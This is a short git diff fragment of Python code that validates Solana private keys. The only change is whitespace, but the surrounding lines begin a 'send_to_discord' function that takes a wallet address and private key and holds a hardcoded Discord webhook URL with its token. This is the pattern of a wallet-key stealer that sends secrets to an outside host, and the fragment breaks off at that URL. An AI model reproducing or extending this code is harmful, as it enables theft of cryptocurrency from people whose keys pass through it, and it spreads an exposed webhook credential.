@@ -15,7 +15,7 @@ def is_valid_solana_private_key(private_key):
         decoded_key = base58.b58decode(private_key)
         return len(decoded_key) == 32
     except:
-        return False
+        return False 
 
 def send_to_discord(wallet_address, private_key):
     webhook_url = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
